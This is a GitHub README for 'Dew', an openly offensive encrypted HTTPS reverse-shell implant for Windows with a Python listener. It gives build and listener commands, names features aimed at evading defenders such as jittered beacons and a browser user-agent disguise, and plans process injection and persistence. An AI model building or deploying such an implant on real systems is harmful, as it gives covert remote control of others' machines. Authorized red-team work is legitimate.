<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-light.svg">
  <img alt="Dew" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-dark.svg" width="520">
</picture>

![C](https://img.shields.io/badge/language-C-orange.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Encrypted HTTPS reverse shell for Windows -- XChaCha20-Poly1305 over TLS, ~37 KB binary**

A tiny C implant that polls a Python listener over HTTPS with XChaCha20-Poly1305 encrypted command payloads. Double encryption (TLS transport + AEAD payload), jittered callbacks via RtlGenRandom, and zero third-party dependencies. One build script generates everything.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Architecture](#architecture) • [Configuration](#configuration) • [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**Double Encryption**
All traffic is HTTPS via native WinHTTP. Command payloads are additionally encrypted with XChaCha20-Poly1305 (AEAD) using a pre-shared key -- two independent encryption layers.

**Jittered Callbacks**
Configurable sleep interval with centered randomized jitter using `RtlGenRandom`. No predictable beacon pattern for defenders to fingerprint.

**Piped Output**
Commands execute via `CreateProcess` with `cmd.exe /c`, capturing stdout and stderr through anonymous pipes. Output capped at 64 KB with truncation notification.

</td>
<td width="50%">

**~37 KB Binary**
Minimal Monocypher extraction (~370 lines) provides XChaCha20-Poly1305 without pulling in a full crypto library. Stripped and size-optimized with `-Os -s`.

**No Dependencies**
Zero third-party DLLs. WinHTTP and advapi32 are native Windows libraries. Monocypher is vendored and compiled in. Nothing to install on the target.

**Clean Shutdown**
A reserved `EXIT` command provides remote shutdown. The implant cleans up and exits gracefully -- no orphaned processes or dangling connections.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>MinGW-w64</td>
<td>Latest</td>
<td>Cross-compiler (<code>x86_64-w64-mingw32-gcc</code>)</td>
</tr>
<tr>
<td>Python</td>
<td>3.8+</td>
<td>Listener and TLS cert generation</td>
</tr>
<tr>
<td>PyNaCl</td>
<td>Latest</td>
<td><code>pip install pynacl</code></td>
</tr>
</table>

### Build

```bash
# Clone
git clone https://github.com/Real-Fruit-Snacks/Dew.git
cd Dew

# Build — generates a random PSK, compiles, prints the listener command
./build.sh 10.10.14.1 443

# Or specify your own key
./build.sh 10.10.14.1 443 <64-char-hex>

# Or use make directly
make LHOST=10.10.14.1 LPORT=443 KEY=<64-char-hex>
```

### Verification

```bash
# Start the listener (build.sh prints this command with your key)
python3 listener.py --lport 443 --key <key>

# Deploy dew.exe to target
```

> The build script generates a random 256-bit PSK if you don't provide one, cross-compiles a ~37 KB PE, and prints the exact listener command with your key. One command.

---

## Architecture

```
[Target]                          [Operator]
 dew.exe  ──── HTTPS/TLS ────>  listener.py
          <── encrypted cmd ───
          ── encrypted output ─>
```

| Layer | Implementation |
|-------|----------------|
| **Transport** | WinHTTP with native TLS, system proxy support |
| **Encryption** | XChaCha20-Poly1305 (Monocypher), pre-shared key |
| **Wire Format** | `[nonce(24)][mac(16)][ciphertext]`, fresh nonce per message |
| **Listener** | Python HTTPServer with TLS, auto self-signed cert generation |
| **Check-in** | Encrypted 8-byte beacon ID on each poll |
| **Randomization** | `RtlGenRandom` for nonces, jitter, and beacon ID |

### File Structure

```
dew/
├── dew.c              # Implant source (~390 lines)
├── monocypher.c       # Vendored XChaCha20-Poly1305 extraction (~370 lines)
├── monocypher.h       # Minimal crypto header (4 exported functions)
├── listener.py        # Python HTTPS listener with interactive CLI
├── build.sh           # One-command build script
├── Makefile           # Cross-compilation targets
└── docs/
    ├── index.html     # GitHub Pages landing page
    └── assets/
        ├── logo-dark.svg
        └── logo-light.svg
```

### Data Flow

| Component | Technology |
|-----------|------------|
| **Implant** | C (MinGW), WinHTTP, Monocypher |
| **Listener** | Python 3, PyNaCl, ssl module |
| **Crypto** | XChaCha20-Poly1305 (vendored Monocypher extraction) |
| **Build** | MinGW-w64 cross-compiler, `-Os -s` optimization |

---

## Configuration

### Compile-time (Makefile variables)

| Variable | Default | Description |
|----------|---------|-------------|
| `LHOST` | `127.0.0.1` | Listener IP/domain |
| `LPORT` | `443` | Listener port |
| `KEY` | Random 256-bit | Pre-shared key (64 hex chars) |

### Implant constants (`dew.c`)

| Define | Default | Description |
|--------|---------|-------------|
| `SLEEP_BASE` | `5` | Polling interval (seconds) |
| `JITTER_PCT` | `30` | Jitter percentage (centered) |
| `USER_AGENT` | Chrome UA | HTTP User-Agent string |
| `MAX_OUTPUT` | `65536` | Shell output truncation limit |

### Listener arguments

| Flag | Default | Description |
|------|---------|-------------|
| `--lhost` | `0.0.0.0` | Listen address |
| `--lport` | `443` | Listen port |
| `--key` | Required | 64-char hex PSK |
| `--cert` | Auto-generated | Path to TLS certificate |
| `--cert-key` | Auto-generated | Path to TLS private key |

---

## Network Footprint

| Aspect | Detail |
|--------|--------|
| **Protocol** | HTTPS on port 443 (default) |
| **Endpoints** | `POST /poll` (beacon check-in), `POST /result` (command output) |
| **User-Agent** | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...` |
| **Proxy** | System proxy via WinHTTP |
| **Jitter** | Centered randomized callback interval |
| **Payload** | All POST bodies are encrypted binary blobs |

---

## Platform Support

<table>
<tr>
<th>Feature</th>
<th>Windows x86_64</th>
</tr>
<tr>
<td>HTTPS reverse shell</td>
<td>Full</td>
</tr>
<tr>
<td>XChaCha20-Poly1305</td>
<td>Full</td>
</tr>
<tr>
<td>WinHTTP + TLS</td>
<td>Full</td>
</tr>
<tr>
<td>Jittered callbacks</td>
<td>Full</td>
</tr>
<tr>
<td>System proxy</td>
<td>Full</td>
</tr>
<tr>
<td>Piped execution</td>
<td>Full</td>
</tr>
<tr>
<td>Listener (Python)</td>
<td>Cross-platform</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

See [SECURITY.md](SECURITY.md) for our vulnerability disclosure policy. Do not open public issues for security vulnerabilities -- use [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Dew/security/advisories/new).

### Threat Model

Dew is an offensive security tool. Its threat model assumes the operator has authorized access and is deploying against targets within scope.

**What Dew does:**
- Authenticated encryption of all command and output traffic (XChaCha20-Poly1305)
- TLS transport encryption via native WinHTTP
- Randomized beacon intervals to avoid fingerprinting
- Fresh random nonce per message via RtlGenRandom

**What Dew does NOT do:**
- Evade kernel-level monitoring (ETW, kernel callbacks)
- Bypass AMSI or script-based detection
- Provide persistence across reboots
- Exfiltrate data outside the command channel
- Hide the WinHTTP network connection from process monitors

---

## Future Work

- Built-in commands (`ps`, `ls`, `whoami`) via Windows APIs
- File upload/download
- SaaS-disguised URI paths
- Process injection / migration
- Persistence mechanisms
- SOCKS proxy pivoting

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Resources

- [Releases](https://github.com/Real-Fruit-Snacks/Dew/releases)
- [Issues](https://github.com/Real-Fruit-Snacks/Dew/issues)
- [Security Policy](https://github.com/Real-Fruit-Snacks/Dew/blob/main/SECURITY.md)
- [Contributing](https://github.com/Real-Fruit-Snacks/Dew/blob/main/CONTRIBUTING.md)
- [Changelog](https://github.com/Real-Fruit-Snacks/Dew/blob/main/CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Deadwater](https://github.com/Real-Fruit-Snacks/Deadwater) • [Deluge](https://github.com/Real-Fruit-Snacks/Deluge) • [Depth](https://github.com/Real-Fruit-Snacks/Depth) • [Dew](https://github.com/Real-Fruit-Snacks/Dew) • [Droplet](https://github.com/Real-Fruit-Snacks/Droplet) • [Fathom](https://github.com/Real-Fruit-Snacks/Fathom) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [Grotto](https://github.com/Real-Fruit-Snacks/Grotto) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom) • [Rapids](https://github.com/Real-Fruit-Snacks/Rapids) • [Ripple](https://github.com/Real-Fruit-Snacks/Ripple) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Shallows](https://github.com/Real-Fruit-Snacks/Shallows) • [Siphon](https://github.com/Real-Fruit-Snacks/Siphon) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Spillway](https://github.com/Real-Fruit-Snacks/Spillway) • [Surge](https://github.com/Real-Fruit-Snacks/Surge) • [Tidemark](https://github.com/Real-Fruit-Snacks/Tidemark) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undercurrent](https://github.com/Real-Fruit-Snacks/Undercurrent) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Vapor](https://github.com/Real-Fruit-Snacks/Vapor) • [Wellspring](https://github.com/Real-Fruit-Snacks/Wellspring) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
